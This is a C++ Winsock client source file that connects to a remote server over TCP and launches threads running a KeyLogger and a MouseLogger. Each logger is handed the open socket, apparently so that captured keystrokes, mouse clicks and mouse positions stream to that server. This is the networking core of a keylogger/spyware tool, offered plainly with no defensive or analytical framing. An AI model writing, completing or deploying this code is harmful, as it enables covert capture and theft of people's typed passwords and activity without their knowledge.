#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "Client.h"


Client::Client()
{
    // we connect to server that uses TCP. thats why SOCK_STREAM & IPPROTO_TCP
    _clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (_clientSocket == INVALID_SOCKET)
        throw std::exception(__FUNCTION__ " - socket");
}

Client::~Client()
{
    try
    {
        // the only use of the destructor should be for freeing 
        // resources that was allocated in the constructor
        closesocket(_clientSocket);
    }
    catch (...) {}
}


void Client::connectToServer(std::string serverIP, int port)
{

    struct sockaddr_in sa = { 0 };

    sa.sin_port = htons(port); // port that server will listen to
    sa.sin_family = AF_INET;   // must be AF_INET
    sa.sin_addr.s_addr = inet_addr(serverIP.c_str());    // the IP of the server

    // the process will not continue until the server accepts the client
    int status = connect(_clientSocket, (struct sockaddr*)&sa, sizeof(sa));

    if (status == INVALID_SOCKET)
        throw std::exception("Cant connect to server");
}


// function runs all of the loggers - as threads
void Client::startConversation()
{
    KeyLogger* kl = new KeyLogger();
    MouseLogger* ml = new MouseLogger();

    std::vector<std::thread> inputsThreads;
    inputsThreads.push_back(std::thread(&KeyLogger::startListen, kl, this->_clientSocket));
    inputsThreads.push_back(std::thread(&MouseLogger::recordMouseClicks, ml, this->_clientSocket));
    inputsThreads.push_back(std::thread(&MouseLogger::recordMousePos, ml, this->_clientSocket));

    for (int i = 0; i < inputsThreads.size(); i++)
        inputsThreads[i].join();
}